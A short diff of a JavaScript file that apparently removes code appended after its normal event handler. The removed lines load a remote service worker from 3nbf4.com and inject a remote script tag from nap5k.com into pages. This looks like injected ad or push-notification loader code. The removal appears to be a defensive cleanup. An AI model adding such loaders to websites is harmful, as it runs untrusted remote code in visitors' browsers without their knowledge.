@@ -30,11 +30,3 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10347604
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
-
-<script>(function(s){s.dataset.zone='10347793',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
